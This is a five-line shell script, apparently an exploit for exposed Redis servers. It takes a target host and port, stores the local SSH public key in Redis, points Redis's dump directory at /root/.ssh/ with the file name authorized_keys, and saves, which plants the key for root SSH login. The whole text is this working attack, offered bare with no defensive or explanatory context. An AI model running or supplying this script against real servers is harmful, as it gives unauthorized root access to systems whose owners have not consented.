(echo -e "\n\n\n" && cat ~/.ssh/id_rsa.pub && echo -e "\n\n\n")|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /root/.ssh/
redis-cli -h $1 -p $2 config set dbfilename authorized_keys
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit